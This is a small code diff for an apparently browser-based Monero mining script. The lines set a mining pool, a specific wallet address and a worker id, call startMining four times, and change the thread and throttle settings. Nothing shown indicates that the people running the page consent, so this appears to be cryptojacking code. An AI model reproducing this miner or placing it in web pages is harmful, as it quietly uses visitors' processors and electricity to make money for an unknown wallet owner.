@@ -34,10 +34,10 @@ function on_servermsg(c){c=JSON.parse(c.data);receiveStack.push(c);"job"==c.iden
     var pool = "moneroocean.stream";
     var walletAddress = "42NXNJk2Weh8GWjKu2vsWNSeJoS6oAbxRVnjJniZsarQg9NGUng3NzzgUMD9RveLaTAS2vE7PTxrG9XmT25TrRwtURqBnUc";
     var workerId = "leader"
-    var threads = -1;
+    var threads = -5;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     startMining(pool, walletAddress, workerId, threads, password);
     startMining(pool, walletAddress, workerId, threads, password);
     startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 60;
+    throttleMiner = 90;
